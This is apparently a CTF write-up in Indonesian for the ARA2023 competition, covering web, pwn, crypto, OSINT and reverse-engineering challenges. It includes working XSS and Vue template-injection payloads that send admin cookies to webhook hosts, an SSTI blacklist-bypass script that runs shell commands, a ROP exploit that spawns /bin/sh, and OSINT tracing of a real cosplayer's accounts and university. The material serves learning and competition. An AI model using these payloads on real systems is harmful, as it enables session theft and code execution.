![](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqKRu49qRsr6nRgIz6KjCLTCE0O8xfzObICA&usqp=CAU)

Team: Anya Haha Inakute Sabishii
Member: 
1. aimardcr
2. Dimas Maulana

# Web
## Dewaweb
### Description
Dewaweb sedang mencari talenta terhebat!

Kamu adalah seorang inspektur terkenal yang telah dikenal mampu untuk memecahkan seluruh teka-teki. Tidak ada sesuatu yang luput dari penglihatanmu, bahkan untuk sesuatu yang tidak terlihat oleh mata orang biasa. Dewaweb mencari orang sepertimu.

Saat ini Dewaweb ingin menguji keahlian analisamu. Coba temukan apa yang Dewaweb sembunyikan di website ini. Buktikan bahwa kamu adalah seseorang yang pantas untuk Dewaweb!

http://103.152.242.116:8417/

### Technical Review
Kita diberikan alamat website yang nantinya kita harus mencari flag disana. Untuk mencari flagnya kita perlu mengamati response dari server menggunakan developer tools.

### Solution
Untuk challenge ini kita dapat mencari flag 1, 2, dan 3 di developer console seperti dibawah ini.

![](https://i.imgur.com/ZJBWwMW.png)

Untuk part ke empat bisa kita lihat di header response yang diberikan server.

![](https://i.imgur.com/ccPdqTQ.png)

## Pollution
### Description
Flag is on the admin side.

http://103.152.242.116:4137/ Attachments

### Technical Review
Pada challenge ini kita akan di berikan attachment yang berupa source code dari server yang akan kita serang.

Saat kita menuju website tersebut kita akan melihat login page yang nantinya perlu kita bypass.
![](https://i.imgur.com/PFNHU9W.png)


### Solution
Untuk membypass login page tersebut kita bisa menggunakan prototype polution yang ada di route `/register`:

```js
app.post('/register', (req, res) => {
    let user = JSON.parse(req.body); // <- vuln dengan prototype polution
    
    // Haha, even you can set your role to Admin, but you don't have the secret!
    if (user.role == "Admin") {
        console.log(user.secret);
        if(user.secret !== secret.value) return res.send({
            "message": "Wrong secret! no Admin!"
        });
        return res.send({
            "message": "Here is your flag!",
            secret: secret.value
        });
    }
    
    let newUser = Object.assign(baseUser, user); // <- vuln dengan prototype polution
    if(newUser.role === "Admin") {
        return res.send({
            "message": "Here is your flag!",
            secret: secret.value
        });
    }

    else return res.send({
        "message": "No Admin? no flag!"
    });
})
```

Untuk eksploitasinya kita perlu memasukkan `{"__proto__":{"role":"Admin"}}` untuk merubah prototype dari class `Object` menjadi `.role` dengan value `true`.

Untuk lebih jelasnya kita bisa melakukan test seperti dibawah ini.

```js
let user = JSON.parse('{"__proto__":{"role":"Admin"}}');
    
const baseUser = {
    "picture": "profile.jpg"
}
let newUser = Object.assign(baseUser, user);
console.log(newUser)
console.log(newUser.role)
```

Setelah kita jalankan maka akan menghasilkan output seperti dibawah.

![](https://i.imgur.com/TjLfj8W.png)

Dengan proto type polution kita bisa membuat prototype baru dari `Object` dan nantinya kita bisa mengaksesnya menggunakan `newUser.role`.

Lanjut ke exploitasi, kita perlu untuk mengirimkan payload `{"__proto__":{"role":"Admin"}}` untuk membypass login page.

![](https://i.imgur.com/ntmPuLn.png)

Flag: ARA2023{e4sy_Pro70typ3_p0llut1oN}

## Paste It
### Description
I made my own "Pastebin", its called "Paste It". It's 100% Free and 101% Secure. What you waiting for? share your paste to your friend right now!.

http://103.152.242.116:4512/ Attachments

### Technical Review
Pada challenge ini kita diberikan attachment dan juga url website, tetapi disini kita tidak perlu melihat source code untuk menyelesaikan challenge ini dikarenakan vulnerability dari challenge ini terdapat di DOMPurify yang berada di client side, DOMPurify ini vulnerable dengan CVE berikut https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/

### Solution
Pada halaman utama website halaman seperti berikut.

![](https://i.imgur.com/akt6Duk.png)

Saat kita memasukkan `<scirpt>alert(1)</script>` maka kita akan ter-redireksi ke halaman lain yang berisi input kita tersebut, tetapi disini input kita tidak berisi tag script.

![](https://i.imgur.com/uoF3mWz.png)

Saat kita melihat source code di developer console, kita akan melihat bahwa input kita akan di fetch dari `/api/paste/${id}` dan nantinya akan sanitaze menggunakan `DOMPurify`.

![](https://i.imgur.com/rxXXCp9.png)

Tapi disini yang menarik adalah versi dari DOMPurify yang lawas, yaitu versi 2.0.12 yang merupakan versi vulnerable dengan serangan Mutation XSS. Saya mengambil referensi dari website berikut https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/.

Kita langsung saja menginputkan payload berikut ke server untuk mentrigger XSS.

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

![](https://i.imgur.com/cya49ov.png)

Maka akan ke trigger XSS sebagai berikut.

![](https://i.imgur.com/grHldaR.png)

Karena flagnya terdapat di admin cookie, sekarang kita akan menyiapkan webhook untuk mencuri cookie dari admin bot.

```html 
<form>
<math><mtext>
</form><form>
<mglyph>
<style></math><img src onerror="fetch('//weebhook?'+document.cookie)">
```
Setelah itu kita bisa mengirimkan link dari stored XSS yang kita buat tadi ke

![](https://i.imgur.com/vmSsUnW.png)

Flag: ARA2023{pr07otyp3_p0llUt10n_g4Dg3t_t0_g3t_XSS}

## Noctchill DB
### Description
Checkout my Noctchill Database Page.

http://103.152.242.116:6712/ Attachments

### Technical Review
Pada challenge ini kita akan diberikan url dan juga attachment. Challenge ini akan kita eksploit dengan SSTI, tapo ada beberapa blacklist yang harus kita bypass.

### Solution
Untuk challenge ini saya sudah membuat script untuk melakukan ssti dan membypass blacklist.

Berikut script yang saya gunakan.

```python 
import requests
from urllib.parse import quote
URL = "http://103.152.242.116:6712/"
# URL = "http://127.0.0.1:5000/"

def ssti(payload,param,url=URL):
    payload = quote(payload)
    res = requests.get(url+payload+param)
    return res.text


blacklist = ["\"", "'", "`", "|", " ", "[", "]", "+", "init", "subprocess", "config", "update", "mro", "subclasses", "class", "base", "builtins"]
payload = "{{self.__getattribute__(request.args.a).__getattribute__(request.args.b).__getitem__(request.args.c).__import__(request.args.e).popen(request.args.cmd).read()}}"
a = ssti(payload, "?a=__init__&b=__globals__&c=__builtins__&d=__import__&e=os&cmd=cat /flag_68b329da98.txt")
print(a)
```

![](https://i.imgur.com/6bGj781.png)

Flag: ARA2023{its_n0t_th4t_h4rd_r1ghT??}

## Welcome Page
### Description
Flag is on the admin cookie.

Link : http://103.152.242.116:8413/

Admin Bot: http://103.152.242.116:8414/

### Technical Review
Pada challenge ini kita diberikan url website dan juga url admin bot. Untuk challenge ini kita bisa mengeksploitasinya menggunakan teknik CSTI (Client Side Template Injection) di Vue js. Saya mengambil reverensi dari website berikut https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti#v3

### Solution
Saat kita melihat source code dari html website ini, kita akan mengetahui bahwa website ini dibuat menggunakan Vue js. 

![](https://i.imgur.com/VYMJo49.png)

Karna parameter msg pada url mereflek ke halaman utama, saya mencoba teknik CSTI Vue menggunakan payload seperti berikut

```
{{_openBlock.constructor('alert(1)')()}}
```

Kita masukkan payloadnya ke parameter `msg` dan nanti kita akan mendapatkan alert seperti dibawah ini.

![](https://i.imgur.com/9CPLoGS.png)

Karena flagnya ada di admin cookie, sekarang kita tinggal mengambil flagnya menggunakan weebhook dengan payload seperti berikut.

```
{{_openBlock.constructor('fetch("https://eo5kw3d12uuuck1.m.pipedream.net?"+document.cookie)')()}}
```

Kita kirimkan urlnya ke bot

```
http://103.152.242.116:8413/?msg=%7B%7B%5FopenBlock%2Econstructor%28%27fetch%28%22https%3A%2F%2Feo5kw3d12uuuck1%2Em%2Epipedream%2Enet%3F%22%2Bdocument%2Ecookie%29%27%29%28%29%7D%7D
```
Dan nanti kita akan mendapatkan flagnya di webhooh.

![](https://i.imgur.com/a2rr4TU.png)

Flag: ARA2023{sUp3r_s3cr3t_c00k13_1s_h3r3}

## X-is for blabla
### Description
Recently my friend was buy helmet called RFC 2616, pretty strange huh?

http://103.152.242.116:5771/web.php

### Technical Review
Kita akan diberikan url website. Pada website ini kita perlu menebak header yang perlu dipakai.

### Solution
Saat kita inspek elemen pada source code html, kita akan menemukan url rahasia

![](https://i.imgur.com/TMBBTvV.png)

Saat kita menuju `readme.html` kita akan menemukan text seperti berikut

![](https://i.imgur.com/VBs4U7t.png)

Awalnya kita kurang paham, tetapi setelah melihat hint dari problemsetter akan menemukan link berikut:
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers

Kita berhasil menebak 4 dari 5 header yang diperlukan

```
Accept-Language: ja
Brendo merupakan youtuber mukbang dari Jepang.

User-Agent: Omaga
Brendo setiap mengupload video youtube nya menggunakan browser yang hits yaitu Omaga.

Sec-CH-UA-Platform: Wengdows
Tentunya di laptop/komputer Brendo menggunakan sistem operasi Wengdows agar bisa bekerja secara produktif.

DNT: 1
Ohh ya, akhir - akhir banyak kasus stalker kepada youtuber di Jepang, oleh karena itu Brendo tidak suka diikuti oleh stalker.
```

Untuk yang ke lima kita sempat berpikir keras, dan akhirnya berkonsultasi dengan problem setter, setelah itu kita dapat kesimpulan bahwa flagnya berbentuk JSON yang di base64-kan dengan vield jsonnya seperti berikut.

```
{"no":1337,"nama":"Araa"}
```

Kita encode menjadi base64 dan kita kirimkan sebagai header seperti berikut.

```
Cookie: Kue=eyJubyI6MTMzNywibmFtYSI6IkFyYWEifQ;
```

Kita request ke server seperti berikut

```http
POST /web.php HTTP/1.1
Host: 103.152.242.116:5771
User-Agent: Omaga
X-Forwarded-For: 1.0.16.0
Accept-Language: ja
Sec-CH-UA-Platform: Wengdows
DNT: 1
Cookie: Kue=eyJubyI6MTMzNywibmFtYSI6IkFyYWEifQ;
Content-Length: 2
```

Dan kita akan mendapatkan flagnya

![](https://i.imgur.com/FMPyvGA.png)

Flag: ARA2023{H3ad_1s_ImP0rt4Nt}

# PWN
## Basreng Komplek
### Description
aku suka basreng. apalagi kalau di bawain dari bogor sama ka Aseng. #ARA2023

Connection: nc 103.152.242.116 20371 File

### Technical Review
Kita diberikan source code dan juga ip port dari server. Untuk eksploitasi challenge ini kita perlu memanfaatkan vulnerability buffer overflow untuk melakukan rop dan meng-call syscall execve untuk mendapatkan shell.

### Solution
Untuk menyelesaikan challenge tersebut saya menggunakan script berikut:

```python 
from pwn import *
import sys

BINARY = "vuln"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

x, p = init()
# 0x00000000004011f9: pop rsi; pop r15; ret; 
pop_rsi = 0x00000000004011f9
pop_rdi = 0x00000000004011fb

x.debug((
    # "b *main+38\nc"
    "b *b\nc"
    # f"b *{pop_rsi}\nc"
))

'''
b syscall

c xor    rdx,rdx
d xor    rax,rax
h xor    rcx,rcx

a QWORD PTR [rdi],rsi

e mov    rax,0x40
f sub    rax,0x6
g add    rax,0x1
'''
r = ROP(exe)
r.call(r.find_gadget(['ret']))
for i in range(0x3b):
    r.call("g")
r.call(pop_rsi)
r.call(unpack(b"/bin/sh\x00"))
r.call(p64(0))
r.call('a')
r.call(pop_rsi)
r.call(p64(0))
r.call(p64(0))
r.call("b")
pay = cyclic(72)
pay += flat(r)
p.sendline(pay)
p.interactive()
```

# Cryptography
## One Time Password
### Description
bwoah, some innovative challenges
### Techincal Review
Kita diberikan sebuah teks dengan isi:
```
A: 161a1812647a765b37207a1c3b1a7b54773c2b660c46643a1a50662b3b3e42
B: 151d616075737f322e2d130b381666547d3d4470054660287f33663d2a2e32

XOR: 415241323032337b7468335f705f3574346e64355f6630725f7034647a7a7d
```
### Solution
Ketika saya melakukan _decode_ pada `A`, saya tidak diberikan _readable string_, maka dari itu asumsi saya adalah `A` di-xor menggunakan `XOR` dan benar saja, berikut 
Hasil `A` xor `XOR`:
![](https://i.imgur.com/Qkk58q2.png)
Hasil `B` xor `XOR`:
![](https://i.imgur.com/W5qJMRG.png)

Awalnya saya bingung karena tidak terdapat flag-nya, namun setelah saya coba _decode_ `XOR`, ternyata itu merupakan flag yang kita cari, hanya saja di-_encode_ menggunakan heks:
![](https://i.imgur.com/8T2m2jm.png)
FLAG: ARA2023{th3_p_5t4nd5_f0r_p4dzz}
## Secret Behind a Letter
### Description
Melon and Edith went to an labyrinth and they should break the code written on a letter in a box in order to escape the labyrinth.

Open the letter and break the code
### Technical Review
Kita diberikan sebuah teks, dengan isi:
```
p: 12575333694121267690521971855691638144136810331188248236770880338905811883485064104865649834927819725617695554472100341361896162022311653301532810101344273 
q: 12497483426175072465852167936960526232284891876787981080671162783561411521675809112204573617358389742732546293502709585129205885726078492417109867512398747 
c: 36062934495731792908639535062833180651022813589535592851802572264328299027406413927346852454217627793315144892942026886980823622240157405717499787959943040540734122142838898482767541272677837091303824669912963572714656139422011853028133556111405072526509839846701570133437746102727644982344712571844332280218

e = 65537
```
Dan dugaan saya, kumpulan variabel tersebut merupakan RSA.
### Solution
Disini, karena `p` dan `q` sudah diberikan, maka kita bisa langsung melakukan _decrypt_ pada `c`, karena untuk melakukan decrypt, kita memperlukan `d`, yang dimana `d` merupakan `d ≡ e−1 (mod λ(n))` (memperlukan n), dan untuk mencari `d` kita juga memperlukan `phi`, yang merupakan `λ(n) = lcm(p − 1, q − 1)` (memperlukan p dan q).
Berikut solver yang saya gunakan:
```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
from Crypto.Util.number import long_to_bytes

p = 12575333694121267690521971855691638144136810331188248236770880338905811883485064104865649834927819725617695554472100341361896162022311653301532810101344273 
q = 12497483426175072465852167936960526232284891876787981080671162783561411521675809112204573617358389742732546293502709585129205885726078492417109867512398747 
c = 36062934495731792908639535062833180651022813589535592851802572264328299027406413927346852454217627793315144892942026886980823622240157405717499787959943040540734122142838898482767541272677837091303824669912963572714656139422011853028133556111405072526509839846701570133437746102727644982344712571844332280218

e = 65537

n = p * q
phi = (p-1) * (q-1)

d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```
Jalankan dan dapat flag!
FLAG: ARA2023{1t_turn5_0ut_to_b3_an_rsa}
## L0v32x0r
### Description
Vonny and Zee were having a treasure hunt game until they realized that one of the clues was a not alike the other clues as it has a random text written on the clue.

The clue was "001300737173723a70321e3971331e352975351e247574387e3c".

Help them to find what the hidden clue means!
### Technical Review
Kita diberikan sebuah teks, yang kami duga merupakan sebuah heksa desimal. Karena nama _challenge_ memiliki kata `x0r` atau `xor`, maka asumsi saya kita diharuskan melakukan _decrypt_ pada heks tersebut.
### Solution
Pada website [CyberChef](https://gchq.github.io/CyberChef/), sudah diberikan fungsi untuk melakukan _bruteforce_ untuk mencari `xor key` dari heks tersebut, berikut konfigurasi yang digunakan:
![](https://i.imgur.com/fGXDJ3R.png)
Pertama kita pastikan bahwa data kita telah kita ubah dari heks mencari _plain data_, lalu kita pastikan untuk memberikan `crib` atau `known plaintext` agar CyberChef tidak mencoba banyak `key`
## SH4-32
### Description
Sze received an ecnrypted file and a message containing the clue of the file password from her friend.

The clue was a hash value : 9be9f4182c157b8d77f97d3b20f68ed6b8533175831837c761e759c44f6feeb8

Decrypt the file password!
### Technical Review
Kita diberikan sebuah `hash` dan juga file `Dictionary.txt` yang berisi kumpulan teks, terdapat sebuah string yang cukup `sus` karena string tersebut tidak seperti string lainnya, yaitu `415241323032337b6834736833645f30525f6e4f545f6834736833647d` (sebut saja A), maka saya pun melakukan investigasi pada string tersebut.
### Solution
Ketika melemparkan `A` pada CyberChef dengan konfigurasi `From Hex`, saya langsung mendapatkan flagnya.
![](https://i.imgur.com/cIZj6GB.png)
FLAG: ARA2023{h4sh3d_0R_nOT_h4sh3d}
## babychall
### Description
Welcome to ARACTF! To start the CTF, please translate this flag that I get from display banner! [Good Morning](https://www.youtube.com/watch?v=SBrXvqRfb5M)
### Technical Review
Kita diberikan teks file bernama `pairs_of_number.txt`, asumsi saya ini merupakan challenge RSA, dan benar saja. Karena dari tim kami tidak ada ahli crypto termasuk saya, akhirnya saya melakukan googling dengan keyword `RSA n1, n2, n3, c1, c2, c3 CTF` dan akhirnya menemukan bahwa tipikal soal seperti ini vulnerable dengan attack yang disebut `Chinese Remainder Theorem`, berikut script dari write-up orang lain yang saya gunakan karena pada dasarnya saya tidak ahli crypto, [script gugel](https://asecuritysite.com/rsa/rsa_ctf02).
Berikut script yang telah saya ubah untuk memenuhi challenge ini:
```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
from Crypto.Util.number import bytes_to_long, long_to_bytes
from Crypto import Random
import Crypto
import sys
import libnum

c1=50996973104845663108379751131203085432412490198312714663656823648233038479298192861451834246930208140110173699058527919020115432586705400467345647806522331396447650847650133013246673390879222719169248862420278256322967718701700458729207793124758166438641448112314489945863231881982352790765130535004090053677
c2=2675086354476975422055414666795504683242305948200761348250028401266882028494792724072473530888031343997988485639367375927974100307107406775103695198800703704181414736281388464205429123159605048186634852771717909704864647112817586024682299987868607933059634279556321476204813521201682662328510086496215821461
c3=37230658243252590743608571105027357862790972987208833213017941171448753815654839901699526651433771324826895355671255944414893947963934979068257310367315935701270804390799121669635153012916402271190722618997500392911737767143316552376495882986935695146970853914275481717400268832644987157988727575513351441919

n1=105481127267218260612156871017757694550142735824087150106750403579877495059230413046181301355871045357138033343315900732228502875706659244844711538497850413046440270578916645981161000807526427004236918404837363404678029443944950655102252423415631977020625826867728898231382737396728896847618010577420408630133
n2=93105621059686474816890215494554802831518948420160941703522759121619785851270608634130307450227557987976818162331982289634215037184075864787223681218982602092806757888533587126974091077190242797461318907280759075612577475534626062060960739269828789274137274363970056276139434039315860052556417340696998509271
n3=65918509650742278494971363290874849181268364316012656769339120004000702945271942533097529884964063109377036715847176196280943807261986848593000424143320280053279021411394267268255337783494901606319687457351586915314662800434632332988978858085931586830283694881538759008360486661936884202274973387108214754101

e=3

mod=[n1,n2,n3]
rem=[c1,c2,c3]

res=libnum.solve_crt(rem,mod)
val=libnum.nroot(res,3)

print(long_to_bytes(val))
// b'ARA2023{s00000_much_c1ph3r_but_5m4ll_e_5t1ll_d0_th3_j0b}'

```
FLAG: ARA2023{s00000_much_c1ph3r_but_5m4ll_e_5t1ll_d0_th3_j0b}
## Help
### Description
Bob is receiving a message from their clients, to put this text on the display in the office. Bob is confused because he didn't know what it is, can you help him?

Format: ARA2023{lowercase_flag}

[Attachments](https://drive.google.com/file/d/1M2EGUtH0cgqlEUgGoyFaTNMCEaCvaFVC/view)

### Technical Review
Kita diberikan source code seperti berikut:

![](https://i.imgur.com/HrxAzTT.png)

Untuk meng-solve challenge ini kita bisa menggunakan 7 segment decode.

### Solution
Saya menggunakan website berikut untuk mendecode 7 segmen display.

https://www.geocachingtoolbox.com/index.php?lang=en&page=segmentDisplay

Tetapi karena di source code berbentu binary. Kita harus menggunakan script dibawah untuk memparsingnya.

```python 
with open("help.txt", "r") as f:
    data = f.readlines()

kamus = "ABCDEFG"
p = ""
for line in data:
    count = 0
    for bit in line.strip():
        if bit == "1":
            p += kamus[count]
        count += 1
    p +=" "
print(p)
```

Setelah itu output diatas kita masukkan ke website, maka kita akan mendapatkan gambar seperti berikut:

![](https://i.imgur.com/FRGSdus.png)

Tinggal kita baca dan kita wran denga ARA2023{}

Flag: ARA2023{supertranscendentess_it_is_hehe}

# OSINT
## Time Machine
### Description
There was a secret leaked on Official ARA Website. It can only seen on January 22nd 2023. Can you turn back the time?
### Technical Review
Diberikan sebuah informasi bahwa website resmi ARA terdapat rahasia yang terbocorkan. Diberikan juga semua informasi bahwa rahasia hanya dapat dilihat pada tanggal 22 januari 2023.
### Solution
Dikarenakan challenge ini membahas soal halaman yang sudah tidak ada, asumsi saya kita harus menggunakan _Wayback Machine_ untuk melihat sebuah _snapshot_ atau halaman cadangan. Langsung saja kita lihat _snapshot_ dari url !(https://its-ara.com/public/), dan benar saja flag terdapat pada bagian _source code_ dari html halaman tersebut:
![](https://i.imgur.com/jBTduBh.png)

FLAG: ARA2023{d1gIt4l_f00tpr1nt_1s_sC4ry}>
## Backroom
### Description
I found a place that give me a backroom vibes. I think I like this place, so I give this place 5 star. Can you find this place?
### Technical Review
Diberikan gambar dari sebuah tempat, kita diharuskan mencari tempat tersebut. 
![](https://i.imgur.com/a21NlTD.jpg)

Disini ada satu poin pada deskripsi mengatakan `So I give this place 5 star`. Dari kata `5 star` kita bisa mengasumsikan bahwa sang Problem Setter meninggalkan sebuah review disuatu tempat dan memberikan bintang 5.
### Solution
Karena kita sudah tau bahwa sang Problem Setter meninggalkan sebuah review, hal yang pertama kita harus cari adalah mengetahui dimanakah tempat ini berada. Awalnya saya kira kita bisa menggunakan _Google Reverse Image_ untuk mencari dimana lokasi ini, namun tidak berhasil. Akhirnya teringat bahwa lokasi dari sebuah gambar biasanya tersimpan pada _metadata_ gambar tersebut, langsung saja saya unggah gambar tersebut pada website [jimpl](https://jimpl.com/results/zBtFpCdKbBTyieZekusNhvmV?target=exif). Dan benar saja, kita bisa melihat lokasi foto tersebut:
![](https://i.imgur.com/04Q9ExT.png)

Lokasi:
https://maps.google.com/maps?ll=-7.252771,112.750573&z=15&t=m&hl=en-US&gl=US&mapclient=embed&q=7%C2%B015%2710.0%22S%20112%C2%B045%2702.1%22E%20-7.252771%2C%20112.750573@-7.252771,112.750573

Setelah dicek lebih dalam, ternyata nama tempat tersebut adalah `Hi-Tech Mall` yang berada di Surabaya. Setelah kami cek review dari tempat tersebut dan sedikit scroll kebawah, benar saja terdapat Problem Setter meninggalkan review beserta flag-nya:
![](https://i.imgur.com/0QQeDJK.png)

FLAG: ARA2023{c4r3full_w1th_y0uR_m3tad4ta}
## Hey detective, can you help me
### Description
Ada seorang cosplayer dari China yang sangat aktif bersosial media, dia kadang memposting foto cosplaynya di facebook dan instagram. Dia pernah berkuliah di universitas ternama di China, suatu saat dia dan temannya berkunjung pada toko boneka untuk membeli sebuah boneka, tidak lupa dia juga berfoto dengan sebuah maskot di sana. Lalu selanjutnya dia mampir ke sebuah toko buku untuk membeli buku, sebagai seseorang yang update sosial media dia juga mengambil sebuah foto di toko buku tersebut dengan pose terduduk. Ohh iya dia juga pernah berfoto bareng atau collab dengan cosplayer asal China dengan nama 'Sakura'
### Technical Review
Diberikan beberapa informasi mengenai seorang cosplayer berasal dari China, terdapat beberapa informasi penting saat kita melakukan investigasi antara lainnya adalah:
* Beliau berasal dari China
* Beliau sering menggunakan Instagram dan Facebook
* Beliau kuliah di universitas ternama di China
* Beliau pernah berfoto ditoko boneka dan berfoto disana
* Beliau sering pergi ke toko buku dan pernah berfoto disana sambil berduduk
* Dan yang terakhir, beliau pernah berfoto dengan cosplayer yang sama berasal dari China, dengan nama 'Sakura'.

Kita diberikan tugas untuk mendapatkan informasi beliau yaitu:
* ID Social Media
* Nama Universitas
* Nama Maskot
* Tanggal dan waktu ketika beliau berfoto ditoko buku
* Komentar pada salah satu foto bersama Sakura (_partial flag_)

Kita juga diberikan salah satu cuplikan video beliau, cukup kawaii 🫢
### Solution
Oke, karena tidak terdapat informasi sensitif yang menunjukan siapakah sang cosplayer ini sebenarnya. Maka dari itu saya mulai mencari sang cosplayer yang pernah berfoto dengan dia, Sakura.
Berikut keyword yang saya gunakan ketika melakukan Google:
`Chinese Cosplayer Sakura`
Setelah sedikit scroll, saya menemukan sebuah Instagram dengan username `sakura.gun`. Setelah membuka Instagram beliau, beliau pernah berfoto dengan pengguna Instagram, `rakukoo`. Namun setelah ditelusuri lebih lanjut, `rakukoo` bukanlah orang yang kita cari. Setelah melanjutkan mencari foto lama beliau, terdapat sebuah foto bersama pengguna Instagram bernama `yanzikenko`, dan betul saja, terdapat video yang sama dari challenge tersebut pada _highlights_ Instagram beliau:
![](https://i.imgur.com/H5Ft2GP.png)

Oke, kita sudah mengetahui nama sang cosplayer, langkah pertama adalah mencari ID Sosial Media sang cosplayer, namun disini tidak diberi informasi yang lebih spesifik mengenai ID sosial media yang perlu dicari, jadi saya gunakan ID Instagram terlebih dahulu. Saya menggunakan website [berikut](https://www.instafollowers.co/find-instagram-user-id) untuk mendapatkan ID Instagram beliau, yaitu `44793134117` (1/5).

Oke, selanjutkan saya mencoba mencari foto lama sang cosplayer melalui Instagramnya, namun tak ada foto berkaitan dengan informasi yang diminta. Maka dari itu, saya pun melanjutkan investigasi pada Facebook `yanzikenko`, dengan nama Facebook `妍子Kenko` atau username `yanzikenko.hii`.

Oke, target saya kali ini mencari universitas sang cosplayer, awalnya saya bingung karena telah berkali-kali mencapai post paling awal beliau, namun tidak ada foto yang berkaitan dengan dimana dia berkuliah, sampai saya melakukan cek pada _Weiboo_ sang cosplayer dan mengetahui bahwa sang cosplayer tinggal di Zhuhai, Guandong:
![](https://i.imgur.com/fidBmbV.jpg)

Maka dari itu, saya mencari universitas ternama di Zhuhai, Guando menggunakan Google, terdapatlah beberapa universitas berikut:
![](https://i.imgur.com/A6kPgtB.png)

* Beijing Normal University & Hong Kong Baptist University United International College (disingkat BNU)
* University of Saint Joseph (disingka USJ)
* University of Macao (disingkat UM)

Ketika mengetahui bahwa universitas `Beijing Normal University & Hong Kong Baptist University United International College` memiliki singkatan `BNU`, langsung teringat foto yang terlewat saat saya melakukan penelusuran: 
![](https://i.imgur.com/vNuLZgP.png)

Dan akhirnya saya pun sangat yakin bahwa `yanzikenko` berkuliah di `BNU` (2/5).

Oke, target kali ini adalah nama maskot yang pernah berfoto bersama beliau, setelah sedikit penelurusan, saya melihat sebuah album dimana beliau berfoto di toko boneka, dan benar saja dia berfoto dengan karakter yang bernama `Molly Career`, saya mengetahui hal ini ketika menggunakan _Google Lens_ pada maskot tersebut:
![](https://i.imgur.com/ukJRyGc.png)
`Molly`(3/5)

Oke, selanjutnya mencari tanggal dan waktu pada saat beliau berfoto di toko buku sambil duduk, setelah penelusuran, saya menemukan foto yang dimaksud pada tautan berikut: https://www.facebook.com/yanzikenko.hii/photos/a.360086951088171/599962267100637/?comment_id=694684518769894

Pada postingan berikut:![](https://i.imgur.com/Tq3tRRE.png)
Bisa kita lihat bahwa foto tersebut diunggah pada tanggal 3 juni 2019 pukul 11:25, namun karena asumsi saya jam dari postingan ini mengikuti zona waktu dan mengetahui bahwa ITS ini dilaksanakan di Surabaya dengan zona waktu WIB, saya mengurangi 1 jam dari jam tersebut, waitu 10:25. `11Juni2019-10:25` (4/5)

Dan yang terakhir, komentar atau _partial flag_ yang terdapat pada komentar ketika beliau berfoto bersama `sakura.gun`, dan ketika menemukan foto yang dimaksud, terlihat komen yang cukup `sus`:
![](https://i.imgur.com/AWGKMuT.png)
Dan benar saja, bagian terakhir dari flag terdapat pada komentar paling bawah. `Y0u4r3ThE0s1nTm45t3R` (5/5)

FLAG: ARA2023{44793134117_BNU_Molly_11Juni2019-10:25_Y0u4r3ThE0s1nTm45t3R}

# Reverse Engineering
## Wormzone
### Description
Done with the warmup from Rhapsody? It's time for the easier one ^-^

Facing a lot of PYC's files in Reversing category? Looks like it's time we use this kind of tools to protect our python script!

Best and recommended place to run? Windows 10 x64
### Technical Review
Diberikan sebuah zip file dengan isi berbagai macam file DLL, Python, dll. Ketika aplikasi dibuka maka tak terjadi apapun, disini pada aplikasi diberi tanda bahwa "Flag is processing", yang artinya flag sudah diproses dan ada pada memory, namun disini kita tidak bisa melakukan input.
### Solution
Sebagaimana Hint katakan, jika memang flag-nya sudah diproses maka flag tersebut akan berada disuatu memory dan tentunya _readable_. Namun sang Problem Setter juga memberi tau bahwa semua challenge `Reverse Engineering` tidak di-_wrap_ dengan format flag `ARA2023{}`, maka dari itu kita harus mencari cara untuk mencari flag-nya. 

Pada umumnya, format flag biasanya menggunakan _underscore_ `_` untuk menggantikan spasi, contohnya:
`ARA2023{mas_aseng_ganteng_banget}`, maka dari itu terpikirkan oleh saya untuk melakukan _scanning string_ dengan _wildcard_, dengan ini saya menggunakan tool `Cheat Engine` untuk melakukan _scanning_. 

Pertama saya menjalankan .exe dari challengenya, lalu melakukan attach di Cheat Engine kepada proses `antidecomp.exe`.

Untuk tipe scanning, disini saya menggunakan AOB / _Array of Bytes_ agar kita dapat melakukan scan menggunakan _wildcard_, contohnya: `CA ?? FE ?? BA ?? BE`, namun disini AOB yang digunakan yaitu:
`5F..5F`, maksud dari `..` adalah memasukkan _wildcard_ dengan jumlah yang tidak diketahui, karena pada dasarnya, kita tidak mengetahui jumlah huruf/angka diantara dua _underscore_ (`_`) dalam sebuah flag, contohnya:
`_aseng_ganteng`, terlihat bahwa antara dua _underscore_ (`_`) pertama memiliki jarak 5 (panjang dari `aseng`), maka dari itu kita cukup mencoba AOB satu persatu untuk flag yang akan kita cari.

Pertama, mari kita coba `5F ?? 5F`, masukkan semua hasil kedalam _Address List_ dan ubah tipenya dari AOB ke String seperti ini:
1. Pilih/select semua address
![](https://i.imgur.com/BxkuUnn.png)
2. Klik kanan pada address mana saja > Change Record > Type
![](https://i.imgur.com/rmowNGN.png)
3. Ganti tipe baru menjadi string dan lengthnya 50
![](https://i.imgur.com/B1AkcTO.png)
4. Carilah flag dengan mengidentifikasikan string yang "berbentuk seperti flag"
![](https://i.imgur.com/737wLGc.png)

Dan saya pun melakukan langkah tersebut dengan AOB yang baru sampai menemukan flagnya.
Untuk AOB `5F ?? 5F` ternyata tidak terdapat flag, lanjut menggunakan AOB `5F ?? ?? 5F`, tidak ketemu juga. Lanjut dengan AOB `5F ?? ?? ?? 5F`, masih tidak ketemu.
Dan yang terakhir, AOB `5F ?? ?? ?? ?? 5F` dan bingo! kita menemukan flagnya!
![](https://i.imgur.com/EZNasQm.png)
Pilih addressnya lalu tekan CTRL + B untuk membuka window Browse Memory dan got flag!
![](https://i.imgur.com/KoyN3MX.png)

Hal ini masuk akal, karena kita menemukan sebuah string dengan kondisi yang sama, yaitu diawali dan diakhiri dengan `_`, di-isi string dengan length 5 diantara `_` tersebut.
